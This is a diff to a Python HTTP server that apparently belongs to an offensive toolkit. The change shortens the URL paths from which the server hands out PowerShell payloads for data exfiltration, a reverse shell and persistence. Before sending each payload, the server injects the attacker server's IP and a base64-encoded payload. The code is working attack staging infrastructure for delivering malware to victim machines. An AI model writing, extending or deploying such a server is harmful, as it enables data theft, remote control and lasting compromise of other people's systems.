@@ -20,7 +20,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         headers = self.headers
-        if self.path == '/run_all':
+        if self.path == '/all':
             try:
                 file_to_open = open('client_exf.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
@@ -38,7 +38,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] Error while sending both files.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-        elif self.path == '/client_exf':
+        elif self.path == '/exf':
             try:
                 file_to_open = open('client_exf.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
@@ -52,7 +52,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] File client_exf.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-        elif self.path == '/client_rvs':
+        elif self.path == '/rvs':
             try:
                 file_to_open = open('client_rvs.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
@@ -66,7 +66,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 log('[-] File client_rvs.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
                 self.wfile.write(b'Not Found')
-        elif self.path == '/client_pers':
+        elif self.path == '/pers':
             try:
                 file_to_open = open('client_pers.ps1','r').read()
                 file_to_open = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
